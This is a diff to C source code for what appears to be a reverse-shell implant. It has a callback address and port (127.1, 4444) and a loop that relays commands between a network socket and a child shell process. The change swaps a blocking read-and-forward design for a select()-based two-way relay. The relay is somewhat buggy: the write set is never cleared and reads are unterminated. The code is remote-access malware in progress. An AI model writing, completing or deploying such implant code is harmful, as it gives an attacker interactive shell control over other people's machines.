@@ -4,11 +4,17 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
+#include <sys/select.h>
 #include <unistd.h>
 
 #define CALLBACK_IP "127.1"
 #define CALLBACK_PORT 4444
 #define BUFFER_SIZE 1024
+
+int max(int val_one, int val_two)
+{
+    return val_one > val_two ? val_one : val_two;
+}
 
 int child_setup(int s)
 {
@@ -45,16 +51,62 @@ void interpreter(int sockfd, int child_pipe)
 {
     struct sockaddr_in client_addr;
     socklen_t cli_len;
-    char buf[BUFFER_SIZE];
+    char sockfd_buf[BUFFER_SIZE];
+    char child_buf[BUFFER_SIZE];
     int recvlen = 0;
     ssize_t read_len = 0;
+    fd_set read_set, write_set;
+    int maxfd = max(sockfd, child_pipe);
 
+    memset(sockfd_buf, 0, BUFFER_SIZE);
+    memset(child_buf, 0, BUFFER_SIZE);
     char *command = "test";
+    FD_ZERO(&read_set);
+    FD_ZERO(&write_set);
 
     for (;;)
     {
-        memset(buf, 0, BUFFER_SIZE);
 
+        FD_SET(sockfd, &read_set);
+        FD_SET(child_pipe, &read_set);
+
+        //Check if there is data to be written to socks
+        if (strlen(sockfd_buf) > 0)
+        {
+            FD_SET(sockfd, &write_set);
+        }
+        if (strlen(child_buf) > 0)
+        {
+            FD_SET(child_pipe, &write_set);
+        }
+
+        if (select(maxfd+1, &read_set, &write_set, NULL, NULL) < 0)
+        {
+            perror("select");
+            exit(EXIT_FAILURE);
+        }
+
+        if(FD_ISSET(sockfd, &write_set)) //sockfd ready to be written
+        {
+            write(sockfd, sockfd_buf, strlen(sockfd_buf));
+            memset(sockfd_buf, 0, BUFFER_SIZE);        
+        }
+        if(FD_ISSET(child_pipe, &write_set))
+        {
+            write(child_pipe, child_buf, strlen(child_buf));
+            memset(child_buf, 0, BUFFER_SIZE);
+        }
+
+        if(FD_ISSET(sockfd, &read_set))
+        {
+            read(sockfd, child_buf, BUFFER_SIZE);
+        }
+        if(FD_ISSET(child_pipe, &read_set))
+        {
+            read(child_pipe, sockfd_buf, BUFFER_SIZE);
+        }
+
+        /*
         recvlen = read(sockfd, buf, BUFFER_SIZE);
         if (recvlen == 0)
         {
@@ -70,7 +122,7 @@ void interpreter(int sockfd, int child_pipe)
         Check for known command
         If unknown command, forward to shell for interpretation
         */
-        if (strncmp(buf, command, strlen(command)) == 0)
+       /* if (strncmp(buf, command, strlen(command)) == 0)
         {
             puts("match!");
         }
@@ -82,6 +134,7 @@ void interpreter(int sockfd, int child_pipe)
             read_len = read(child_pipe, buf, BUFFER_SIZE);
             write(sockfd, buf, read_len);
         }
+        */
         
     }
 
